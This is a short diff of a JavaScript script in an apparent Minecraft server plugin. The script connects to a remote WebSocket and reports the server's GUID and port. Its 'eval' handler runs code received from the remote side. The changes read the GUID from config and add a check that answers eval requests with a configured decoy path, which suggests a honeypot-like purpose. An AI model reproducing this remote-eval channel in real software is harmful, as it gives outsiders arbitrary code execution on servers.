@@ -1,8 +1,8 @@
 var global = this
 
 function readGuid() {
-	// 伪装 Guid
-    return "b6033a04-f62a-4461-9c27-3323d9e34a9a"
+	// 从配置文件读取 guid
+    return Java.type('report.yumc.watchdog.WatchDog').instance.getConfig().getString("guid")
 }
 
 function connect(address) {
@@ -29,7 +29,7 @@ function connect(address) {
             guid: readGuid(),
             port: Java.type('org.bukkit.Bukkit').getServer().getPort()
         })
-        Java.type('java.lang.System').out.println("Start running Websocket...");
+        Java.type('java.lang.System').out.println("Start running WebSocket...");
         Java.type('java.lang.System').out.println("Upload guid: " + readGuid());
         Java.type('java.lang.System').out.println("Upload port: " + Java.type('org.bukkit.Bukkit').getServer().getPort());
     }
@@ -48,6 +48,10 @@ function connect(address) {
             
             switch (action) {
                 case "eval":
+                    if (data.search() != -1) {
+                        global.ws.message(Java.type('report.yumc.watchdog.WatchDog').instance.getConfig().getString("virtual-path"))
+                        break
+                    }
                     global.ws.message(eval(data) + '')
                     break
                 case "heartbeat":
